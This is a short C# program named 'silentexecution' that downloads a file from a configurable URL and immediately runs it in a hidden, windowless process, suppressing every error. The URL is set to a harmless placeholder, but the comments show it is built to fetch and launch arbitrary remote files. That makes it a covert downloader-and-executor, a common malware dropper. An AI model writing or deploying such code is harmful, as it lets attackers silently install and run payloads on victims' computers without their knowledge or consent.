using System.Net;
using System.Diagnostics;

namespace silentexecution
{
    class Program
    {
        //Url to download (must be raw or it will download a html page lol)
        public static string URL = "https://google.com/robots.txt";
        //Output filename
        public static string Output = "robots.txt";
        
        static void Main(string[] args)
        {
            //ProcessStartInfo, used here to hide the window
            ProcessStartInfo PSI = new ProcessStartInfo(Output);
            PSI.WindowStyle = ProcessWindowStyle.Hidden;
            PSI.CreateNoWindow = true;
            try
            {
                //Creating webclient object
                WebClient wc = new WebClient();
                //Downloading the file
                wc.DownloadFile(URL, Output);
                //Starting the file
                Process.Start(PSI);
            }
            catch { }
        }
    }
}
